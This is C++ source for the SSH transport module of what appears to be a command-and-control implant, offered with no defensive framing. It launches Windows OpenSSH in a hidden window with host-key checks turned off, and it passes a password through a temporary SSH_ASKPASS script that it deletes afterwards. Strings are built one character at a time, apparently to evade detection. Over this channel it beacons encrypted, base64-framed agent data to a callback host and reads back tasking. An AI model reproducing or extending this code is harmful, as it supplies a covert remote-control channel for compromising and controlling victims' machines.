#include <common.h>
#include <module.h>
#include <transport_ssh.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>

#if defined( SSH_TRANSPORT )

using namespace stardust;

namespace starburst {

static auto declfn ssh_spawn_process( instance& inst ) -> bool {
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE h_stdin_read  = NULL;
    HANDLE h_stdin_write = NULL;
    HANDLE h_stdout_read  = NULL;
    HANDLE h_stdout_write = NULL;

    if ( !inst.kernel32.CreatePipe( &h_stdin_read, &h_stdin_write, &sa, 0 ) )
        return false;
    if ( !inst.kernel32.CreatePipe( &h_stdout_read, &h_stdout_write, &sa, 0 ) )
        return false;

    inst.kernel32.SetHandleInformation( h_stdin_write, HANDLE_FLAG_INHERIT, 0 );
    inst.kernel32.SetHandleInformation( h_stdout_read, HANDLE_FLAG_INHERIT, 0 );

    char cmdline[1024] = {};
    char ssh_path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','O','p','e','n','S','S','H','\\','s','s','h','.','e','x','e', 0 };

    char* p = cmdline;
    auto append = [&p]( const char* s ) { while ( *s ) *p++ = *s++; };
    auto append_char = [&p]( char c ) { *p++ = c; };

    append( ssh_path );
    append( " -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -p " );

    char port_str[8] = {};
    uint32_t port = inst.transport.callback_port;
    int pi = 0;
    if ( port == 0 ) port = 2222;
    char tmp[8]; int ti = 0;
    do { tmp[ti++] = '0' + (port % 10); port /= 10; } while ( port > 0 );
    for ( int i = ti - 1; i >= 0; i-- ) port_str[pi++] = tmp[i];
    append( port_str );
    append_char( ' ' );

    append( inst.transport.ssh_username );
    append_char( '@' );
    append( inst.transport.callback_host );

    // SSH_ASKPASS script for password auth
    char askpass_path[MAX_PATH] = {};
    char temp_dir[MAX_PATH] = {};
    inst.kernel32.GetTempPathA( MAX_PATH, temp_dir );

    char askpass_name[] = { 's','b','_','a','p','.','c','m','d', 0 };
    char* dp = askpass_path;
    char* sp = temp_dir;
    while ( *sp ) *dp++ = *sp++;
    sp = askpass_name;
    while ( *sp ) *dp++ = *sp++;
    *dp = 0;

    HANDLE h_askpass = inst.kernel32.CreateFileA(
        askpass_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if ( h_askpass != INVALID_HANDLE_VALUE ) {
        char prefix[] = { '@','e','c','h','o',' ','o','f','f','\r','\n','e','c','h','o',' ', 0 };
        DWORD written;
        inst.kernel32.WriteFile( h_askpass, prefix, 16, &written, NULL );
        uint32_t pw_len = 0;
        while ( inst.transport.ssh_password[pw_len] ) pw_len++;
        inst.kernel32.WriteFile( h_askpass, inst.transport.ssh_password, pw_len, &written, NULL );
        inst.kernel32.CloseHandle( h_askpass );
    }

    char env_askpass[] = { 'S','S','H','_','A','S','K','P','A','S','S', 0 };
    char env_require[] = { 'S','S','H','_','A','S','K','P','A','S','S','_','R','E','Q','U','I','R','E', 0 };
    char env_display[] = { 'D','I','S','P','L','A','Y', 0 };
    char val_force[]   = { 'f','o','r','c','e', 0 };
    char val_display[] = { 'l','o','c','a','l','h','o','s','t',':','0', 0 };

    inst.kernel32.SetEnvironmentVariableA( env_askpass, askpass_path );
    inst.kernel32.SetEnvironmentVariableA( env_require, val_force );
    inst.kernel32.SetEnvironmentVariableA( env_display, val_display );

    STARTUPINFOA si = {};
    si.cb = sizeof( STARTUPINFOA );
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = h_stdin_read;
    si.hStdOutput = h_stdout_write;
    si.hStdError  = h_stdout_write;

    PROCESS_INFORMATION pi_info = {};

    BOOL created = inst.kernel32.CreateProcessA(
        NULL,
        cmdline,
        NULL, NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si,
        &pi_info
    );

    inst.kernel32.SetEnvironmentVariableA( env_askpass, NULL );
    inst.kernel32.SetEnvironmentVariableA( env_require, NULL );
    inst.kernel32.SetEnvironmentVariableA( env_display, NULL );

    inst.kernel32.CloseHandle( h_stdin_read );
    inst.kernel32.CloseHandle( h_stdout_write );

    if ( !created ) {
        inst.kernel32.CloseHandle( h_stdin_write );
        inst.kernel32.CloseHandle( h_stdout_read );
        inst.kernel32.DeleteFileA( askpass_path );
        return false;
    }

    inst.ssh.h_process = pi_info.hProcess;
    inst.ssh.h_thread  = pi_info.hThread;
    inst.ssh.h_stdin   = h_stdin_write;
    inst.ssh.h_stdout  = h_stdout_read;
    inst.ssh.connected = true;

    for ( int i = 0; askpass_path[i]; i++ )
        inst.ssh.askpass_path[i] = askpass_path[i];

    inst.kernel32.Sleep( 2000 );
    inst.kernel32.DeleteFileA( askpass_path );

    return true;
}

static auto declfn ssh_is_alive( instance& inst ) -> bool {
    if ( !inst.ssh.h_process ) return false;
    DWORD exit_code = 0;
    inst.kernel32.GetExitCodeProcess( inst.ssh.h_process, &exit_code );
    return exit_code == STILL_ACTIVE;
}

static auto declfn ssh_write_pipe( instance& inst, const uint8_t* data, uint32_t len ) -> bool {
    DWORD written = 0;
    DWORD total = 0;
    while ( total < len ) {
        if ( !inst.kernel32.WriteFile( inst.ssh.h_stdin, data + total, len - total, &written, NULL ) )
            return false;
        total += written;
    }
    return true;
}

static auto declfn ssh_read_pipe( instance& inst, uint8_t* buf, uint32_t len, uint32_t timeout_ms ) -> bool {
    DWORD total = 0;
    DWORD start = inst.kernel32.GetTickCount();

    while ( total < len ) {
        DWORD available = 0;
        if ( !inst.kernel32.PeekNamedPipe( inst.ssh.h_stdout, NULL, 0, NULL, &available, NULL ) )
            return false;

        if ( available > 0 ) {
            DWORD to_read = len - total;
            if ( to_read > available ) to_read = available;
            DWORD read_bytes = 0;
            if ( !inst.kernel32.ReadFile( inst.ssh.h_stdout, buf + total, to_read, &read_bytes, NULL ) )
                return false;
            total += read_bytes;
        } else {
            if ( (inst.kernel32.GetTickCount() - start) > timeout_ms )
                return false;
            inst.kernel32.Sleep( 50 );
        }
    }
    return true;
}

auto declfn ssh_init( instance& inst ) -> bool {
    inst.ssh.h_process = NULL;
    inst.ssh.h_thread  = NULL;
    inst.ssh.h_stdin   = NULL;
    inst.ssh.h_stdout  = NULL;
    inst.ssh.connected = false;
    inst.ssh.persistent = (inst.transport.ssh_mode == 0);
    return true;
}

auto declfn ssh_send(
    instance& inst,
    uint8_t*  data,
    uint32_t  len,
    uint8_t** response,
    uint32_t* resp_len
) -> bool {
    *response = NULL;
    *resp_len = 0;

    if ( !inst.ssh.connected || !ssh_is_alive( inst ) ) {
        if ( inst.ssh.h_process ) {
            ssh_destroy( inst );
        }
        if ( !ssh_spawn_process( inst ) )
            return false;
    }

    // encrypt the data
    uint8_t* encrypted = nullptr;
    uint32_t enc_len   = 0;

    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) )
        return false;

    // prepend UUID + encrypted
    uint32_t uuid_len = str_len( inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) {
        inst.heap_free( encrypted );
        return false;
    }

    memory::copy( raw, inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    // base64 encode
    uint32_t b64_len = 0;
    auto b64_data = base64_encode( inst, raw, raw_len, &b64_len );
    inst.heap_free( raw );

    if ( !b64_data ) return false;

    // send length-prefixed b64 message over SSH pipe
    uint8_t len_buf[4];
    len_buf[0] = (b64_len >> 24) & 0xFF;
    len_buf[1] = (b64_len >> 16) & 0xFF;
    len_buf[2] = (b64_len >>  8) & 0xFF;
    len_buf[3] = (b64_len >>  0) & 0xFF;

    if ( !ssh_write_pipe( inst, len_buf, 4 ) ) {
        inst.heap_free( b64_data );
        goto fail;
    }
    if ( !ssh_write_pipe( inst, (uint8_t*)b64_data, b64_len ) ) {
        inst.heap_free( b64_data );
        goto fail;
    }
    inst.heap_free( b64_data );

    // read length-prefixed response
    {
        uint8_t resp_hdr[4];
        if ( !ssh_read_pipe( inst, resp_hdr, 4, 30000 ) )
            goto fail;

        uint32_t rlen = ((uint32_t)resp_hdr[0] << 24) |
                        ((uint32_t)resp_hdr[1] << 16) |
                        ((uint32_t)resp_hdr[2] <<  8) |
                        ((uint32_t)resp_hdr[3]);

        if ( rlen == 0 || rlen > 10 * 1024 * 1024 )
            goto fail;

        uint8_t* rbuf = (uint8_t*)inst.heap_alloc( rlen );
        if ( !rbuf ) goto fail;

        if ( !ssh_read_pipe( inst, rbuf, rlen, 60000 ) ) {
            inst.heap_free( rbuf );
            goto fail;
        }

        // base64 decode response
        uint32_t decoded_len = 0;
        auto decoded = base64_decode( inst, rbuf, rlen, &decoded_len );
        inst.heap_free( rbuf );

        if ( !decoded || decoded_len < 36 ) {
            if ( decoded ) inst.heap_free( decoded );
            goto fail;
        }

        // skip UUID prefix (36 bytes), decrypt
        uint8_t* cipher_data = decoded + 36;
        uint32_t cipher_len  = decoded_len - 36;

        uint8_t* plain     = nullptr;
        uint32_t plain_len = 0;

        if ( !crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
            inst.heap_free( decoded );
            goto fail;
        }

        inst.heap_free( decoded );

        *response = plain;
        *resp_len = plain_len;
    }

    if ( !inst.ssh.persistent ) {
        ssh_destroy( inst );
    }

    return true;

fail:
    inst.ssh.connected = false;
    return false;
}

auto declfn ssh_destroy( instance& inst ) -> void {
    if ( inst.ssh.h_stdin ) {
        inst.kernel32.CloseHandle( inst.ssh.h_stdin );
        inst.ssh.h_stdin = NULL;
    }
    if ( inst.ssh.h_stdout ) {
        inst.kernel32.CloseHandle( inst.ssh.h_stdout );
        inst.ssh.h_stdout = NULL;
    }
    if ( inst.ssh.h_process ) {
        inst.kernel32.TerminateProcess( inst.ssh.h_process, 0 );
        inst.kernel32.CloseHandle( inst.ssh.h_process );
        inst.ssh.h_process = NULL;
    }
    if ( inst.ssh.h_thread ) {
        inst.kernel32.CloseHandle( inst.ssh.h_thread );
        inst.ssh.h_thread = NULL;
    }
    if ( inst.ssh.askpass_path[0] ) {
        inst.kernel32.DeleteFileA( inst.ssh.askpass_path );
        inst.ssh.askpass_path[0] = 0;
    }
    inst.ssh.connected = false;
}

} // namespace starburst

#endif // SSH_TRANSPORT
